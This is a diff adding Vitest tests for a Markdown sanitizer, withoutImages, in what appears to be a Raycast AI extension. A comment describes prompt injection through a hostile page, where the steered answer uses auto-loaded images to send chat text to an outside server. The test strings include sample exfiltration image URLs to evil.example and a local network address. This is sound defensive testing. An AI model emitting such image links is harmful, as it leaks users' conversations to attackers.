@@ -1,12 +1,13 @@
 import { describe, it, expect } from "vitest";
 import {
+  escapeMarkdown,
   formatBytes,
   formatClock,
   formatSpeed,
   plural,
   progressMessage,
+  withoutImages,
   wrapText,
-  escapeMarkdown,
 } from "../src/lib/format";
 
 describe("formatBytes", () => {
@@ -80,5 +81,23 @@ describe("escapeMarkdown", () => {
 
   it("leaves ordinary words alone", () => {
     expect(escapeMarkdown("I Got Coached By Faker")).toBe("I Got Coached By Faker");
+  });
+});
+
+describe("withoutImages", () => {
+  // Raycast loads Markdown images by itself, so an answer steered by a hostile page
+  // could send chat text to any server, or make this Mac request a local address.
+  it("turns images into their alt text and drops image HTML", () => {
+    expect(withoutImages("See ![a chart](https://evil.example/p?d=secret) here")).toBe("See a chart here");
+    expect(withoutImages("![](http://192.168.1.1/x.png)")).toBe("");
+    expect(withoutImages('x <img src="https://evil.example/p"> y')).toBe("x  y");
+    expect(withoutImages("Ref ![logo][1]\n\n[1]: https://evil.example/l.png")).toBe(
+      "Ref logo\n\n[1]: https://evil.example/l.png",
+    );
+  });
+
+  it("keeps links and everything else", () => {
+    const md = "**Bold** [4:05](https://www.youtube.com/watch?v=x&t=245s) and `code`";
+    expect(withoutImages(md)).toBe(md);
   });
 });
